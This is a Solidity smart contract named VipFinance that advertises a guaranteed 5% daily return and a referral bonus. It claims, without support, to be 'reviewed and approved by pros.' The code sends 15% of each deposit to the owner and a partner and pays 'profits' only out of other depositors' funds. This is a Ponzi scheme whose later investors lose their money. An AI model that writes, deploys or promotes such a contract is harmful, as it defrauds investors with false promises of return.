1 pragma solidity ^0.4.25;
2 
3 /** 
4  * contract VipFinance
5  * 
6  *  GAIN 5% PER 24 HOURS (every 5900 blocks)
7  * 
8  *  How to use:
9  *  -Send any amount of ether to make an investment
10  *  -Claim your profit by sending 0 ether transaction (every day or every time you prefer)
11  *  Or send more ether to reinvest AND get your profit at the same time
12  *
13  *  Referal Program:
14  *  5% for every deposit of your direct referals
15  *  If you want to invite your referlas to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
16  * 
17  * 
18  * RECOMMENDED GAS LIMIT: 250000
19  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
20  *
21  * Contract reviewed and approved by pros!
22 **/
23 
24 contract VipFinance{
25 
26     address public owner;
27     address public partner;    
28     
29 	mapping (address => uint256) deposited;
30 	mapping (address => uint256) withdrew;
31 	mapping (address => uint256) refearned;
32 	mapping (address => uint256) blocklock;
33 
34 	uint256 public totalDepositedWei = 0;
35 	uint256 public totalWithdrewWei = 0;
36 	uint256 public investorNum = 0;
37 	
38 	event invest(address indexed beneficiary, uint amount);
39 
40     constructor () public {
41         owner   = msg.sender;
42         partner = msg.sender;
43     }
44     
45     modifier onlyOwner {
46         require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
47         _;
48     }    
49     
50     //Adverts & PR Partner
51     function setPartner(address newPartner) external onlyOwner {
52         partner = newPartner;
53     }
54  
55 
56 	function() payable external {
57 		emit invest(msg.sender,msg.value);
58 		uint256 admRefPerc = msg.value / 10;
59 		uint256 advPerc    = msg.value / 20;
60 
61 		owner.transfer(admRefPerc);
62 		partner.transfer(advPerc);
63 
64 		if (deposited[msg.sender] != 0) {
65 			address investor = msg.sender;
66             // calculate profit amount as such:
67             // amount = (amount invested) * 5% * (blocks since last transaction) / 5900
68             // 5900 is an average block count per day produced by Ethereum blockchain
69             uint256 depositsPercents = deposited[msg.sender] * 500 / 10000 * (block.number - blocklock[msg.sender]) /5900;
70 			investor.transfer(depositsPercents);
71 
72 			withdrew[msg.sender] += depositsPercents;
73 			totalWithdrewWei += depositsPercents;
74 		} else if (deposited[msg.sender] == 0)
75 			investorNum += 1;
76 
77 		address referrer = bytesToAddress(msg.data);
78 		if (referrer > 0x0 && referrer != msg.sender) {
79 			referrer.transfer(advPerc);
80 			refearned[referrer] += advPerc;
81 		}
82 
83 		blocklock[msg.sender] = block.number;
84 		deposited[msg.sender] += msg.value;
85 		totalDepositedWei += msg.value;
86 	}
87 	
88 	function userDepositedWei(address _address) public view returns (uint256) {
89 		return deposited[_address];
90     }
91 
92 	function userWithdrewWei(address _address) public view returns (uint256) {
93 		return withdrew[_address];
94     }
95 
96 	function userDividendsWei(address _address) public view returns (uint256) {
97         return deposited[_address] * 500 / 10000 * (block.number - blocklock[_address]) / 5900;
98     }
99 
100 	function userReferralsWei(address _address) public view returns (uint256) {
101 		return refearned[_address];
102     }
103 
104 	function bytesToAddress(bytes bys) private pure returns (address addr) {
105 		assembly {
106 			addr := mload(add(bys, 20))
107 		}
108 	}
109 }